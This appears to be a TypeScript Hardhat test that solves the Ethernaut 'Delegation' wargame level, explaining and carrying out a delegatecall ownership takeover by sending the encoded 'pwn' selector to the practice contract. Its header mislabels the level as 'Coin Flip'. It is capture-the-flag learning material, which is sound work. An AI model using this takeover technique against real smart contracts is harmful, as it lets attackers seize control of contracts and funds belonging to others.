// # Ethernaut 6: Coin Flip

import {artifacts, ethers} from 'hardhat'
import {Contract, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x9451961b7Aea1Df57bc20CC68D72f662241b5493'
const INSTANCE_ADDRESS = '0x0C2Ac4E510561942eb130a6598a94abE24fF3Ae0'

describe('06 Delegation', () => {
  let ethernaut: Contract
  let instance: Contract
  let signer: Signer
  let signerAddress: string

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Delegation', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
  })

  // `Delegation` has a `fallback` function which relays whatever call data is sent
  // to `Delegate`, which it calls using `delegatecall`. Since `Delegate` has a `pwn`
  // function which sets `owner` to `msg.sender`, we become owner by executing that
  // function in the context of `Delegation`. This is achieved by sending the function
  // signature of `pwn` as call data in the transaction.
  it("sends tx with encoded 'pwn' function data to instance", async () => {
    const delegateArtifact = await artifacts.readArtifact('Delegate')
    const iface = new ethers.utils.Interface(delegateArtifact.abi)
    const fndata = iface.encodeFunctionData('pwn')
    const params = {
      to: instance.address,
      data: fndata,
      gasLimit: 1000000,
    }
    const tx = await signer.sendTransaction(params)
    return expectStatusOK(tx)
  })

  it('has become owner', async () => {
    const ownerAddr = await instance.owner()
    expect(ownerAddr).to.equal(signerAddress)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
